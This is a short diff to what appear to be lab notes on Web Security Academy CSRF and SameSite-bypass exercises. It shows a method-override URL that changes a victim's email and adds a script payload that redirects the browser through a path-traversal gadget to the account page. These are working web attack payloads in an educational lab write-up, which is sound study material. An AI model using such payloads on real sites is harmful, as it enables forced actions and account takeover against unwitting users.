@@ -135,6 +135,13 @@ PHP Symphony has `_method` that allows us to specify the method sent to the serv
 https://example.com/my-account/change-email?email=pwned@web-security-academy.net&_method=POST
 ```
 
+Payload 
+```bash
+<script>
+    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account";
+</script>
+```
+
 
 
 
